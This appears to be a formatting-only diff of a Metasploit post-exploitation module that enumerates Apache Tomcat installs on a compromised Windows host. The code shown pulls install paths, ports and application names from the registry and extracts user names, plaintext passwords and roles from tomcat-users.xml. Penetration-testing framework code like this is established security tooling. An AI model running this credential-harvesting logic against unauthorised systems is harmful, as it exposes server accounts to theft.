@@ -10,26 +10,28 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather Apache Tomcat Enumeration',
-      'Description'   => %q{
-        This module will collect information from a Windows-based Apache Tomcat. You will get
-        information such as: The installation path, Tomcat version, port, web applications,
-        users, passwords, roles, etc.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [
-        'Barry Shteiman <barry[at]sectorix.com>', # Module author
-      ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Apache Tomcat Enumeration',
+        'Description' => %q{
+          This module will collect information from a Windows-based Apache Tomcat. You will get
+          information such as: The installation path, Tomcat version, port, web applications,
+          users, passwords, roles, etc.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Barry Shteiman <barry[at]sectorix.com>', # Module author
+        ],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   # method called when command run is issued
   def run
-
     installs = []
     results = []
     users = []
@@ -38,7 +40,7 @@ class MetasploitModule < Msf::Post
       installs += identify_registry
       if not installs.empty?
         installs.each do |inst|
-          results += enumerate_tomcat(inst[0],inst[1])
+          results += enumerate_tomcat(inst[0], inst[1])
           users += enumerate_tomcat_creds(inst[0])
         end
       else
@@ -53,15 +55,16 @@ class MetasploitModule < Msf::Post
     print_status("Done, Tomcat Found.")
 
     tbl_services = Rex::Text::Table.new(
-      'Header'  => "Tomcat Applications ",
-      'Indent'  => 1,
+      'Header' => "Tomcat Applications ",
+      'Indent' => 1,
       'Columns' =>
         [
           "Host",
           "Tomcat Version",
           "Port",
           "Web Application"
-        ])
+        ]
+    )
 
     results.each { |r|
       report_service(:host => session.sock.peerhost, :port => r[2], :name => "http", :info => "#{r[0]} Tomcat #{r[1]}, Application:#{r[3]}")
@@ -69,18 +72,19 @@ class MetasploitModule < Msf::Post
     }
 
     tbl_users = Rex::Text::Table.new(
-      'Header'  => "Tomcat Server Users ",
-      'Indent'  => 1,
+      'Header' => "Tomcat Server Users ",
+      'Indent' => 1,
       'Columns' =>
         [
           "Host",
           "User",
           "Password",
           "Roles"
-        ])
+        ]
+    )
 
     users.each { |u|
-      tbl_users << [ session.sock.peerhost,u[0],u[1],u[2] ]
+      tbl_users << [ session.sock.peerhost, u[0], u[1], u[2] ]
     }
 
     print_line()
@@ -107,7 +111,7 @@ class MetasploitModule < Msf::Post
   ### deep server enumeration methods ###
 
   # enumerate tomcat
-  def enumerate_tomcat(val_installpath,val_version)
+  def enumerate_tomcat(val_installpath, val_version)
     results = []
     found = false
     print_good("\t\t+ Version: #{val_version}")
@@ -129,7 +133,7 @@ class MetasploitModule < Msf::Post
     ports.uniq.each do |p|
       print_good("\t\t+ Port: #{p}")
       found = true
-      results << [session.sock.peerhost,"#{val_version}",p,appname]
+      results << [session.sock.peerhost, "#{val_version}", p, appname]
     end
     if found
       print_good("\t\t+ Application: [#{appname}]")
@@ -152,13 +156,13 @@ class MetasploitModule < Msf::Post
 
       if not doc.elements.empty?
         doc.elements.each('tomcat-users/user') do |e|
-          e_user=e.attributes['name']
-          if e_user.length >0
-            e_user=e.attributes['name']
+          e_user = e.attributes['name']
+          if e_user.length > 0
+            e_user = e.attributes['name']
           else
-            e.user=e_user=e.attributes['username']
+            e.user = e_user = e.attributes['username']
           end
-          users << [ e_user,e.attributes['password'],e.attributes['roles'] ]
+          users << [ e_user, e.attributes['password'], e.attributes['roles'] ]
           print_good("\t\t+ User:[#{e_user}] Pass:[#{e.attributes['password']}] Roles:[#{e.attributes['roles']}]")
         end
       else
@@ -175,7 +179,7 @@ class MetasploitModule < Msf::Post
 
   ### helper functions ###
 
-  #this method identifies the correct registry path to tomcat details, and returns [path,version]
+  # this method identifies the correct registry path to tomcat details, and returns [path,version]
   def identify_registry
     values = []
     basekey = "HKLM\\SOFTWARE\\Apache Software Foundation\\Tomcat"
@@ -186,15 +190,15 @@ class MetasploitModule < Msf::Post
         services = registry_enumkeys(major_version_key)
 
         if services.empty?
-          val_installpath = registry_getvaldata(major_version_key,"InstallPath")
-          val_version = registry_getvaldata(major_version_key,"Version")
-          values << [val_installpath,val_version]
+          val_installpath = registry_getvaldata(major_version_key, "InstallPath")
+          val_version = registry_getvaldata(major_version_key, "Version")
+          values << [val_installpath, val_version]
         else
           services.each do |s|
             service_key = "#{major_version_key}\\#{s}"
-            val_installpath = registry_getvaldata(service_key,"InstallPath")
-            val_version = registry_getvaldata(service_key,"Version")
-            values << [val_installpath,val_version]
+            val_installpath = registry_getvaldata(service_key, "InstallPath")
+            val_version = registry_getvaldata(service_key, "Version")
+            values << [val_installpath, val_version]
           end
         end
       end
@@ -205,9 +209,9 @@ class MetasploitModule < Msf::Post
     return nil || []
   end
 
-  #this function extracts the application name from the main page of the web application
+  # this function extracts the application name from the main page of the web application
   def find_application_name(val_installpath)
-    index_file = ['index.html','index.htm','index.php','index.jsp','index.asp']
+    index_file = ['index.html', 'index.htm', 'index.php', 'index.jsp', 'index.asp']
     path = val_installpath + "\\webapps"
     if not directory?(path + "\\ROOT")
       print_error("\t\t! expected directory wasnt found")
@@ -218,13 +222,14 @@ class MetasploitModule < Msf::Post
       if not exist?("#{path}\\ROOT\\#{i}")
         next
       end
+
       data = read_file(path + "\\ROOT\\#{i}")
       if data =~ /(?i)<title>([^<]+)<\/title>/
         return $1
       else
-        #look for redirect as name
+        # look for redirect as name
         if data =~ /(?i)onload=\"?document\.location\=['"]?([\/\w\d]+)['"]?\"?/
-          return $1.gsub("/","")
+          return $1.gsub("/", "")
         end
       end
     end
